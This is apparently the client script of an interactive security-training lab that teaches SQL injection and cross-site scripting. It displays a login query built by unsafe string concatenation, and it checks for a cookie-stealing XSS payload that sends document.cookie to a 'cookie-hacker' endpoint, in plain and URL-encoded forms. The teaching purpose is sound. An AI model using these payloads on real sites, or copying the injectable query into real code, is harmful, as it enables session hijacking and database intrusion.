$(document).ready(function() {
    function SetTimeOut(className, time) {
        setTimeout(function() {
            $("." + className).fadeIn(1000);
            $(".barRight .content").animate({ scrollTop: 10000 }, 2000);
        }, time);
    }
    SetTimeOut("one", 1000);
    SetTimeOut("two", 5000);
    SetTimeOut("three", 9000);
    $("iframe").on("load", function() {
        var iframe = $(this).contents();
        //changePassword
        var email =''
        var password = ''
        iframe.find("#email").keyup(function(event) {
            email = $(this).val()
            var sql="SELECT * FROM users WHERE email='"+email+"' and password='"+password+"'"
            iframe.find('.showSql').val(sql);

        });
        iframe.find("#password").keyup(function(event) {
            password = $(this).val()
            var sql="SELECT * FROM users WHERE email='"+email+"' and password='"+password+"'"
            iframe.find('.showSql').val(sql);
        });

        


        // auth
        iframe.find("#login").submit(function(e) {
            e.preventDefault();
            var email = iframe.find("#email").val();
            var password = iframe.find("#password").val();
            var _token = iframe.find('input[name="_token"]').val();
            $.ajax({
                type: "POST",
                url: "action/sql/login",
                data: { email: email, password: password, _token: _token },
                success: function(response) {
                    if (response == "SQL login success") {
                        
                        SetTimeOut("eleven", 1000);
                        SetTimeOut("twelve", 5000);
                        $("iframe").attr("src","action/sql/home")
                        // SetTimeOut("two", 1000);
                    } else {
                        iframe.find(".alert-login").fadeIn();
                        iframe.find(".alert-login").html(response);
                        if(response=='Email or Password is not correct'){
                            SetTimeOut("four", 1000);
                            SetTimeOut("five", 5000);
                        }else{
                            SetTimeOut("six", 1000);
                            SetTimeOut("seven", 5000);
                        }
                    }
                },
                error: function(error){
                    iframe.find(".alert-login").fadeIn();
                    iframe.find(".alert-login").html(error);
                },
            });
        });
        // deploy js
        iframe.find("#deploy").click(function() {
            var code = iframe
                .find("#text-code")
                .val()
                .replace(/\s+/g, "");
            if (code == "if(isset($_GET['cookie'])){return$_GET['cookie'];}") {
                SetTimeOut("eight", 1000);
            }
            if (
                code ==
                "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);</script>"
            ) {
                SetTimeOut("nine", 1000);
                SetTimeOut("ten", 6000);
                SetTimeOut("eleven", 10000);
                SetTimeOut("twelve", 12000);
            }
            if(code=="if(isset($_GET['search']))returnhtmlspecialchars($_GET['search']);")
                    SetTimeOut("sixteen", 1000);

        });
        // access url
        iframe.find(".address").keypress(function(e) {
            var val=$(this).val().replace(/\s+/g, "");
              if (e.which === 13) {
                  $("iframe").attr("src",val.slice(17));
                  if(val=="http://localhost/action/xss/reflected-xss?search=<script>window.open%28'http%3A%2F%2Flocalhost%2Faction%2Fxss%2Fcookie-hacker%3Fcookie%3D'%2Bdocument.cookie%29%3B<%2Fscript>"){
                    SetTimeOut("thirteen", 1000);
                  }
              }
          });
        //code script
        $("#showFileCode").click(function() {
            $("iframe").attr("src", "action/sql/code");
            SetTimeOut("eight", 1000);
            SetTimeOut("nine", 6000);
            SetTimeOut("ten", 11000);
        });
        $(".home").click(function(){
            $("iframe").attr
        });

    });
});
